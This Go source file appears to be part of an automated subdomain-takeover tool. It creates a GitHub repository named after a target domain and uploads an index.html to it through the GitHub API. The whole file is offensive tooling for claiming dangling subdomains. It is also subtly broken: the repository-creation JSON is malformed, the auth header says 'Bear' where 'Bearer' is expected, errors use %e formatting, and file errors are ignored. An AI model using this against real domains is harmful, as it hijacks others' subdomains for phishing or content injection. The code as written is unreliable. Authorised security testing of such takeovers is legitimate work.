package autotakeover

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"time"
)

const INDEX_HTML_PATH string = "index.html"

func createIndexFile(repo string) (bool, error) {
	endpoint := fmt.Sprintf("%s/repos/%s/contents/index.html", baseUrl, repo)
	jsonStr := []byte(fmt.Sprintf(`{"message": "add index.html file", "content": "%s"}`, convertFileIntoB64(INDEX_HTML_PATH)))

	response, err := doReq(http.MethodPost, endpoint, jsonStr)
	if err != nil {
		return false, fmt.Errorf("failed creating index.html file in repository: %e", err)
	}

	if response.StatusCode != http.StatusCreated {
		return false, fmt.Errorf("expected API to return 201 but got %d. did the file already exist?", response.StatusCode)
	}

	return true, nil
}

func convertFileIntoB64(path string) string {
	f, _ := os.OpenFile(path, os.O_RDONLY, 0600)
	reader := bufio.NewReader(f)
	content, _ := io.ReadAll(reader)

	return base64.StdEncoding.EncodeToString(content)
}

func createRepository(domain string) (bool, string, error) {
	jsonStr := []byte(fmt.Sprintf(`{"name": "%s", has_issues": false"`, domain))

	response, err := doReq(http.MethodPost, fmt.Sprintf("%s/user/repos", baseUrl), jsonStr)
	if err != nil {
		return false, "", fmt.Errorf("failed creating repository: %e", err)
	}

	if response.StatusCode != http.StatusCreated {
		return false, "", fmt.Errorf("repository creation failed: %s", response.Body)
	}

	type responseFields struct {
		Id       string `json:"id"`
		FullName string `json:"full_name"`
	}

	var resBody responseFields
	defer response.Body.Close()
	bRes, _ := io.ReadAll(response.Body)
	if err := json.Unmarshal(bRes, &resBody); err != nil {
		return true, "", fmt.Errorf("failed parsing response body but creation was successful: %e", err)
	}

	fmt.Printf("successfully created repository %s for subdomain takeover %s", resBody.FullName, domain)

	return true, resBody.FullName, nil
}

func doReq(method, path string, body []byte) (*http.Response, error) {
	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	req, err := http.NewRequest(method, path, bytes.NewBuffer(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("Authorization", fmt.Sprintf("Bear %s", githubToken))
	req.Header.Set("X-Github-Api-Version", "2022-11-28")

	response, err := client.Do(req)
	if err != nil {
		return nil, err
	}

	return response, nil
}
